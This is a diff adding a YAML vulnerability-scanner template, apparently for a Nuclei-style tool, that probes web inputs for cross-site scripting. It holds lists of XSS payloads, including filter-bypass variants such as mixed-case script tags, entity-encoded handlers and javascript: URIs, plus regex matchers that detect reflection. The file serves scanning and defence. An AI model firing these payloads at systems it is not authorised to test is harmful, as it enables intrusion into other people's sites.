@@ -1,0 +1,72 @@
+id: xss-basic
+info:
+  name: "Cross-Site Scripting"
+  severity: high
+  description: >
+    사용자 입력이 HTML로 비위생화 출력될 때 발생하는 취약점.
+    스크립트 태그 또는 이벤트 핸들러가 응답에 반사되면 취약점으로 판정.
+  references:
+    - https://portswigger.net/web-security/cross-site-scripting
+  tags: [xss, injection, client-side]
+
+definition:
+  method: [GET, POST]
+  position: [query, body, form_field, header]
+
+payload_groups:
+  - group: reflected_basic
+    engine: "Reflected XSS - 기본 태그"
+    payloads:
+      - "<script>alert(1)</script>"
+      - "<script>alert('xss')</script>"
+      - "<img src=x onerror=alert(1)>"
+      - "<svg onload=alert(1)>"
+
+  - group: reflected_bypass
+    engine: "Reflected XSS - 필터 우회"
+    payloads:
+      - "<ScRiPt>alert(1)</sCrIpT>"
+      - "<img src=x onerror=\"alert&#40;1&#41;\">"
+      - "javascript:alert(1)"
+      - "<iframe src=\"javascript:alert(1)\"></iframe>"
+      - "\"><script>alert(1)</script>"
+      - "'><script>alert(1)</script>"
+
+  - group: dom_based
+    engine: "DOM-based XSS"
+    payloads:
+      - "#<script>alert(1)</script>"
+      - "#\"><img src=x onerror=alert(1)>"
+
+  - group: event_handlers
+    engine: "이벤트 핸들러 기반"
+    payloads:
+      - "<body onload=alert(1)>"
+      - "<input autofocus onfocus=alert(1)>"
+      - "<details open ontoggle=alert(1)>"
+
+matchers_condition: or
+
+matchers:
+  - type: regex
+    name: script_tag_reflected
+    description: "script 태그가 응답에 그대로 반사됨"
+    regex:
+      - "<script>alert\\(.*?\\)</script>"
+      - "<script>alert\\('xss'\\)</script>"
+
+  - type: regex
+    name: event_handler_reflected
+    description: "이벤트 핸들러가 응답에 반사됨"
+    regex:
+      - "onerror=alert\\("
+      - "onload=alert\\("
+      - "onfocus=alert\\("
+      - "ontoggle=alert\\("
+
+  - type: regex
+    name: svg_xss_reflected
+    description: "SVG 기반 XSS 반사"
+    regex:
+      - "<svg onload=alert\\("
+      - "<svg/onload=alert\\("
